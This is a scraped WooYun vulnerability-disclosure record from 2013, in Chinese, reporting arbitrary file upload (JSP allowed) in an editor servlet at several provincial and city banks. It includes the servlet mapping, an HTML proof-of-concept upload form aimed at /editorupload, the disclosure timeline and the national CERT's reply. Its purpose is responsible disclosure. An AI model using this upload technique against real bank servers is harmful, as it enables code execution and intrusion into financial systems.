{"id": 8636, "wybug_id": "wooyun-2013-036938", "wybug_title": "一批中小银行任意类型文件上传", "wybug_corp": "一批中小银行", "wybug_author": "鶆鶈", "wybug_date": "2013-09-13 10:50", "wybug_open_date": "2013-10-28 10:50", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-28：\t细节向公众公开  简要描述： 一批省级市级银行任意类型文件上传，可上jsp （好吧，我承认我是来刷rank的） 详细说明：  1)见： WooYun: 一批中小银行任意文件下载 2)从web.xml中看到这么一段上传的配置：\n<!--编辑器上传-->  <servlet>        <servlet-name>editorUpload</servlet-name>        <servlet-class>ehm.module.editor.upload.UploadServlet</servlet-class>    </servlet>    <servlet-mapping>        <servlet-name>editorUpload</servlet-name>        <url-pattern>/editorupload</url-pattern>    </servlet-mapping>   <servlet-mapping>        <servlet-name>editorUpload</servlet-name>        <url-pattern>/site067/editorupload</url-pattern>    </servlet-mapping>\n3)测试:\n<html><title>upload test</title><script>function uploadFile(){\tdocument.uploadform.action=document.getElementById(\"actionUrl\").value;\tdocument.uploadform.submit();}</script><body>Action URL:<input id=\"actionUrl\" type=\"text\" size=\"45\" value=\"http://mybank.com/editorupload\"><form style=\"margin:0px;display:inline;\" method=\"post\" name=\"uploadform\" enctype=\"multipart/form-data\">filepath:<input name=\"filepath\" type=\"text\" size=\"25\" value=\"download\"><input type=\"file\" name=\"NewFile\"></form><input type=\"button\" value=\"upload\" onclick=\"uploadFile()\"></body></html>\n   漏洞证明：  \n\n   修复方案：  禁止JSP后缀文件名上传?   版权声明：转载请注明来源 鶆鶈@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-09-18 08:54 厂商回复： CNVD确认并复现所述情况，已经分别转由CNCERT湖北、四川、辽宁、河北等分中心处置，同时抄报银监会（行业信息化监管部门）。rank 20 最新状态： 2013-09-18：补充：测试过程中未能找到明确的软件开发方，已经建议行业主管部门对此进行调查。  ", "replys": "漏洞评价：\n评论\n     2013-09-13 14:12 |    \t\t小痞子 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:21        | <xss>alert(\"a\")</xss>￥&@&……dssKhwjcw...)\t\t \n  开门~查水表    \n     2013-09-13 17:38 |    \t\t鶆鶈 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:30        )\t\t \n  @小痞子 先查他： WooYun: 一批中小银行任意文件下载    \n     2013-10-08 11:02 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  悲剧，居然被人提交了哈。    \n     2013-10-08 14:14 |    \t\t鶆鶈 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:30        )\t\t \n  @wefgod 骚里啊，大侠。    \n     2013-10-08 14:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @鶆鶈 那个任意文件下载刚出来其实哥就那啥了。哈哈。不过无所谓了    \n     2013-10-28 13:15 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  @鶆鶈 @wefgod 略叼    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}